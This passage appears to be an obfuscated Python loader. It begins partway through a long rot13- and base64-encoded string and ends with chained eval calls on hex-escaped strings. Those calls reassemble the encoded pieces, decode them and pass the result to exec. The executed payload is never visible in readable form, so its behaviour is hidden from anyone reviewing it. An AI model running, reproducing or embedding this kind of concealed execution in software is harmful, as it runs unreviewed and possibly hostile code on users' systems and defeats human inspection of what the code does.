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'
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))